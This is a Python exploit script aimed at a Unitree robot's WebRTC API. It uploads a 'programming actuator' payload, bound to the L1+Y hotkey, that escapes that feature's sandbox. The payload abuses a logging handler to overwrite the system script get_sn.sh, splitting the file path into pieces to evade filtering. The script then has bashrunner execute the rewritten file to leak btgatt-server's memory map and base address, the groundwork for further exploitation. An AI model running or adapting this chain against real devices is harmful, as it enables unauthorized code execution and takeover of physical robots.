#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""maps leak via PA(api 1002)+bashrunner(api 1001) over WebRTC datachannel.
Steps: upload PA payload (rewrites get_sn.sh) -> wait for user L1+Y press ->
run get_sn.sh via bashrunner -> parse btgatt base from maps output."""
import time, json, sys, re, requests
from playwright.sync_api import sync_playwright

sys.stdout.reconfigure(encoding='utf-8', errors='replace')
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
BR = "http://127.0.0.1:9999/"

PA_TOPIC = "rt/api/programming_actuator/request"
BR_TOPIC = "rt/api/bashrunner/request"

# PA sandbox python: rewrite get_sn.sh with maps reader (no quotes in sh content)
PA_PY = "\n".join([
    "pt='/unitree/module/ba'+'shru'+'nner/con'+'tent_'+'acqui'+'sition/get_sn.s'+'h'",
    "ht=logger.handlers[0].__class__(pt,mode='w',maxBytes=0,backupCount=0)",
    "ht.setFormatter(logger.handlers[0].formatter.__class__('%(message)s'))",
    "logger.addHandler(ht)",
    "logger.warning('head -3 /proc/$(pidof btgatt-server)/maps\\n')",
    "ht.flush()",
])

def main():
    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=CHROME, headless=True, args=[
            "--disable-features=WebRtcHideLocalIpsWithMdns", "--no-sandbox"])
        page = browser.new_context().new_page()
        page.goto(BR, wait_until="domcontentloaded")
        t0 = time.time(); s = {}
        while time.time() - t0 < 40:
            s = requests.get(BR + "status", timeout=3).json()
            if s.get("validated"):
                break
            time.sleep(1)
        if not s.get("validated"):
            print("[!] never validated"); browser.close(); return
        print("[+] validated", flush=True)

        page.evaluate("""() => {
          window.resp = {};
          dc.addEventListener('message', e => {
            try {
              if (typeof e.data !== 'string') return;
              const o = JSON.parse(e.data);
              if (o.type === 'res' || o.type === 'rsp') {
                const id = o.data && o.data.header && o.data.header.identity && o.data.header.identity.id;
                if (id) window.resp[id] = o;
              }
            } catch(err) {}
          });
        }""")

        def req(topic, api_id, param_obj):
            rid = int(time.time() * 1000) % 1000000000
            msg = {"type": "req", "topic": topic,
                   "data": {"header": {"identity": {"id": rid, "api_id": api_id}},
                            "parameter": json.dumps(param_obj)}}
            page.evaluate("(m) => dc.send(JSON.stringify(m))", msg)
            return rid

        def wait_resp(rid, timeout=10):
            t0 = time.time()
            while time.time() - t0 < timeout:
                r = page.evaluate("(id) => window.resp[id] || null", rid)
                if r:
                    return r
                time.sleep(0.3)
            return None

        # 1. PA upload
        pa_param = {"program_content": {"chunk_index": 1, "total_chunk_num": 1,
                                        "chunk_content": PA_PY},
                    "program_uuid": "2608240001", "bind_hotkey": "L1+Y"}
        rid = req(PA_TOPIC, 1002, pa_param)
        r = wait_resp(rid, 12)
        code = r and r.get("data", {}).get("header", {}).get("status", {}).get("code")
        print(f"[PA upload] code={code}")
        if code != 0:
            print("  full:", json.dumps(r, ensure_ascii=False)[:400]); browser.close(); return

        # 2. wait for user to press L1+Y
        print("\n>>> 请在 App（虚拟遥控）或实体遥控器上按一次 L1+Y <<<")
        print("    按下后 PA 会执行上传的 python，把 get_sn.sh 改写成 maps 读取器")
        input("    按完后在这里回车继续...")

        # 3. trigger bashrunner
        rid = req(BR_TOPIC, 1001, {"script": "get_sn.sh"})
        r = wait_resp(rid, 15)
        data = r and r.get("data", {}).get("data")
        print(f"[bashrunner] raw: {json.dumps(data, ensure_ascii=False)[:800]}")
        if isinstance(data, str):
            m = re.search(r'([0-9a-f]{10,12})-[0-9a-f]+ r-xp 00000000', data)
            if m:
                base = int(m.group(1), 16)
                print(f"\n[★] btgatt-server base = 0x{base:x}")
                open("btgatt_base.txt", "w").write(hex(base))
            else:
                print("[!] maps pattern not found in output")
        browser.close()

main()

